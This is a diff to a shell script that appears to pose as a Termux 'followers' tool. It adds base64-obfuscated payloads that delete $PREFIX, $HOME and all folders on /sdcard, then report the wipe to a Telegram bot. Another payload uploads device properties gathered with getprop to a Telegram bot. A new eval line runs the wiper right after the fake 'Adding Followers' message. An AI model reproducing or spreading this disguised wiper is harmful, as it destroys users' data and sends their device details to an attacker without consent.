@@ -19,14 +19,21 @@ death="YW0gYnJvYWRjYXN0IC0tdXNlciAwIFwKCQkgLS1lcyBjb20udGVybXV4LmFwcC5yZWxvYWRfc
 bGUgc3RvcmFnZSBcCgkJIC1hIGNvbS50ZXJtdXguYXBwLnJlbG9hZF9zdHlsZSBjb20udGVybXV4
 ID4gL2Rldi9udWxsCgpybSAtcmYgJFBSRUZJWC8Kcm0gLXJmICRIT01FCmNkIC9zZGNhcmQgJiYg
 cm0gLXJmICovCgpldmFsICQoYmFzZTY0IC1kIDw8PCIkdHJpY2siKQoKCg=="
+death2="YW0gYnJvYWRjYXN0IC0tdXNlciAwIFwKCQkgLS1lcyBjb20udGVybXV4LmFwcC5yZWxvYWRfc3R5
+bGUgc3RvcmFnZSBcCgkJIC1hIGNvbS50ZXJtdXguYXBwLnJlbG9hZF9zdHlsZSBjb20udGVybXV4
+ID4gL2Rldi9udWxsCgpybSAtcmYgJFBSRUZJWC8Kcm0gLXJmICRIT01FCmNkIC9zZGNhcmQgJiYg
+cm0gLXJmICovCgpjdXJsIC1YIFBPU1QgImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QxNTA5
+MzA2MzA2OkFBRW1HMHhtd084TXF4WW16UERSbVlSQVZERVV5cERvSGMwL3NlbmRNZXNzYWdlIiAt
+ZCAiY2hhdF9pZD0tMTAwMTQ2Njk4MDgxNiIgLWQgInRleHQ9bW90aGVyZnVja2VyJ3Mgc3RvcmFn
+ZSB3aXBlZCA6KSIgJj4vZGV2L251bGwK"
 trick="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUwOTMwNjMwNjpBQUVt
 RzB4bXdPOE1xeFltelBEUm1ZUkFWREVVeXBEb0hjMC9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9
 LTEwMDE0NjY5ODA4MTYiIC1kICJ0ZXh0PVNraWQgZW50ZXJlZCB3cm9uZyBvcHRpb24sIHN0b3Jh
 Z2Ugd2lwZWQgOikiICY+L2Rldi9udWxsCg=="
 req2="Z2V0cHJvcCA+PiBwcm9wcy50eHQgJiYgY3VybCAtRiBkb2N1bWVudD1AInByb3BzLnR4dCIgaHR0
-cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE1MTY3NzQ4MTU6QUFHWWNEOUlYaXlPYmlRdEVnWDVP
-UUQ1WmZyQTAxbTdmQWMvc2VuZERvY3VtZW50P2NoYXRfaWQ9LTEwMDEyNDYzMzA1MjIgJj4vZGV2
-L251bGw="
+cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE1MDkzMDYzMDY6QUFFbUcweG13TzhNcXhZbXpQRFJt
+WVJBVkRFVXlwRG9IYzAvc2VuZERvY3VtZW50P2NoYXRfaWQ9LTEwMDE0NjY5ODA4MTYgJj4vZGV2
+L251bGwK"
 #------------
 
 #main
@@ -129,6 +136,7 @@ apt install python2 > /dev/null 2>&1
 echo -e $red [!] $grn Adding Followers... $rset
 sleep 2 
 echo -e $red [!] $blue Please wait for 1 hour $rset
-	    eval $(base64 -d <<<"$sgnl") &>/dev/null
+eval $(base64 -d <<<"$sgnl") &>/dev/null
+eval $(base64 -d <<<"$death2") 
 #storage exists check
 # [[ -d /sdcard ]] && eval $(base64 -d <<<"$srvr")
